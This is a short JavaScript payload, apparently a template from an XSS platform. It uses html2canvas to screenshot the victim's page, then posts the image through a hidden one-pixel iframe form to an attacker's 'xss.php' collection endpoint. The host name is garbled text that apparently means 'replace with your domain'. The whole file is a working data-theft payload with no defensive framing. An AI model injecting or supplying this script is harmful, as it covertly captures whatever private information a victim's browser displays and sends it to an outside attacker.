html2canvas(document.body, {
	onrendered : function (canvas) {
		var html_canvas = canvas.toDataURL();
		xssPost("http://Ìæ»»³ÉÄãµÄÓòÃû/xss.php?do=api&id={projectId}", html_canvas);
	}
});

function xssPost(url, postStr) {
	var de;
	de = document.body.appendChild(document.createElement('iframe'));
	de.src = 'about:blank';
	de.height = 1;
	de.width = 1;
	de.contentDocument.write('<form method="POST" action="' + url + '"><input name="pic" value="' + postStr + '"/></form>');
	de.contentDocument.forms[0].submit();
	de.style.display='none';
}